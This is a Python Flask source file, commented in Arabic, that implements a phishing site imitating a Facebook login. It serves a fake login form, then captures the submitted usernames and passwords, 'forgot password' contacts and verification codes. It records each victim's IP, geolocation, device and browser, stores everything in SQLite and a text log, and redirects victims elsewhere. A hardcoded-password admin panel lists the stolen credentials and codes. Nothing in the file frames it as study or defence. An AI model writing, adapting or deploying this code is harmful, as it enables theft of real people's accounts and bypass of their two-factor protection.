from flask import Flask, request, redirect, render_template, send_from_directory, session
from datetime import datetime
import os
import logging
import sqlite3
import requests
from colorama import Fore

# ========================
# إنشاء قاعدة البيانات
# ========================
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    # جدول المستخدمين
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    # جدول الأكواد
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        code TEXT,
        ip TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        time TEXT
    )
    """)

    # جدول الزيارات
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        path TEXT,
        method TEXT,
        user_agent TEXT,
        visitor_type TEXT,
        time TEXT
    )
    """)

    conn.commit()
    conn.close()

# تشغيل قاعدة البيانات
init_db()

# ========================
# Logging
# ========================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

print(Fore.GREEN + "++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")

# ========================
# إعداد Flask
# ========================
app = Flask(__name__)
app.secret_key = "secret123"

# مسار log.txt
log_path = os.path.join(os.path.dirname(__file__), "log.txt")

# ========================
# تحديد الموقع
# ========================
def get_location(ip):
    try:
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url, timeout=3)
        data = response.json()
        country = data.get("country", "Unknown")
        city = data.get("city", "Unknown")
        isp = data.get("isp", "Unknown")
        return country, city, isp
    except:
        return "Unknown", "Unknown", "Unknown"

# ========================
# تسجيل كل request
# ========================
@app.before_request
def log_every_request():
    # تحديد IP الصحيح
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip:
        ip = ip.split(",")[0]

    country, city, isp = get_location(ip)

    path = request.path
    method = request.method
    user_agent = request.headers.get("User-Agent", "").lower()
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # تحديد نوع الزائر
    if "facebookexternalhit" in user_agent:
        visitor_type = "Facebook Bot"
    elif "uptimerobot" in user_agent:
        visitor_type = "UptimeRobot"
    elif "bot" in user_agent or "crawl" in user_agent:
        visitor_type = "Other Bot"
    else:
        visitor_type = "Real User"

    # تسجيل في log
    logging.info(f"{visitor_type} | {method} {path} | {ip} | {country} | {city} | {isp}")

    # حفظ في database
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
    INSERT INTO visits (ip, country, city, isp, path, method, user_agent, visitor_type, time)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (ip, country, city, isp, path, method, user_agent, visitor_type, time))
    conn.commit()
    conn.close()

# ========================
# favicon
# ========================
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')

# ========================
# ping
# ========================
@app.route("/ping")
def ping():
    logging.info(Fore.BLACK + "(PING) request received")
    return "OK", 200

# ========================
# الصفحة الرئيسية
# ========================
@app.route("/")
def home():
    logging.info(Fore.GREEN + "User opened homepage")
    return render_template("FacebookForm.html")

# ========================
# detect device
# ========================
def detect_device(user_agent):
    ua = user_agent.lower()

    if "android" in ua or "iphone" in ua:
        device = "Mobile Phone"
    elif "ipad" in ua or "tablet" in ua:
        device = "Tablet"
    else:
        device = "Computer"

    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ios" in ua:
        os_name = "iOS"
    elif "mac" in ua:
        os_name = "MacOS"
    else:
        os_name = "Unknown"

    if "chrome" in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua:
        browser = "Safari"
    else:
        browser = "Unknown"

    return device, os_name, browser

# ========================
# login
# ========================
@app.route("/login", methods=["POST"])
def login():

    username = request.form.get("username")
    password = request.form.get("password")

    logging.info(Fore.RED + f"Login attempt with username : {username} and password : {password}")

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip:
       ip = ip.split(",")[0]
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # حفظ في database
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
    INSERT INTO users (email, password, ip, device, os, browser, time)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (username, password, ip, device, os_name, browser, time))
    conn.commit()
    conn.close()

    # حفظ في log.txt
    log_data = f"""
Username: {username}
Password: {password}
IP: {ip}
Device: {device}
OS: {os_name}
Browser: {browser}
Time: {time}
-------------------------
"""
    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
        f.write(log_data)

    login_botton_url = "https://2742404919047.sarhne.com"
    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
    return redirect(login_botton_url)

# ========================
# create
# ========================
@app.route("/create")
def create():
    return redirect("https://www.fhyi.com")

# ========================
# forgot
# ========================
@app.route("/forgot")
def forgot():
    return render_template("forgot.html")

# ========================
# verify
# ========================
@app.route("/verify", methods=["POST"])
def verify():

    phone_or_email = request.form.get("phone_or_email")

    session["phone_or_email"] = phone_or_email

    logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")

    # حفظ في log.txt
    log_data = f"""
Forgot Request
Phone/Email: {phone_or_email}
-------------------------
"""
    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
        f.write(log_data)

    logging.info("Redirected user to verify code page")
    return render_template("verify.html")

# ========================
# verify_code
# ========================
@app.route("/verify_code", methods=["POST"])
def verify_code():

    code = request.form.get("code")
    phone_or_email = session.get("phone_or_email", "Unknown")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
    INSERT INTO codes (email, code, ip, device, os, browser, time)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (phone_or_email, code, ip, device, os_name, browser, time))
    conn.commit()
    conn.close()

    # حفظ في log.txt
    log_data = f"""
Verification Code
Email: {phone_or_email}
Code: {code}
-------------------------
"""
    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
        f.write(log_data)
    logging.info(Fore.RED + f"Verify Code: {code}")

    login_botton_url = "https://2742404919047.sarhne.com"
    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
    return redirect(login_botton_url)

# ========================
# 🔐 Admin Login
# ========================
@app.route("/admin_login", methods=["GET", "POST"])
def admin_login():

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == "Hasan@RR" and password == "RafifIsMyLove":
            session["admin"] = True
            return redirect("/admin")
        else:
            return "❌ بيانات خاطئة"

    return """
    <h2>Admin Login</h2>
    <form method="POST">
    <input name="username"><br><br>
    <input name="password" type="password"><br><br>
    <button>Login</button>
    </form>
    """

# ========================
# admin (عرض البيانات)
# ========================
@app.route("/admin")
def admin():

    if not session.get("admin"):
        return redirect("/admin_login")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM visits")
    visits = cursor.fetchall()

    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()

    cursor.execute("SELECT * FROM codes")
    codes = cursor.fetchall()
    conn.close()

    # إنشاء HTML للعرض
    html = "<h2>Users</h2><table border='1' cellpadding='5'><tr>"
    html += "<th>ID</th><th>Email</th><th>Password</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
    for user in users:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"
    html += "</table><br><br>"

    html += "<h2>Codes</h2><table border='1' cellpadding='5'><tr>"
    html += "<th>ID</th><th>Email</th><th>Code</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
    for code in codes:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"
    html += "</table><br><br>"

    html += "<h2>Visits</h2><table border='1' cellpadding='5'><tr>"
    html += "<th>ID</th><th>IP</th><th>Country</th><th>City</th><th>ISP</th><th>Path</th><th>Method</th><th>User Agent</th><th>Visitor Type</th><th>Time</th></tr>"
    for visit in visits:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"
    html += "</table>"

    return html

# ========================
# logout
# ========================
@app.route("/logout")
def logout():
    session.pop("admin", None)
    return "تم تسجيل الخروج"

# ========================
# تشغيل السيرفر
# ========================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    logging.info("Server is running...")
    app.run(host="0.0.0.0", port=port)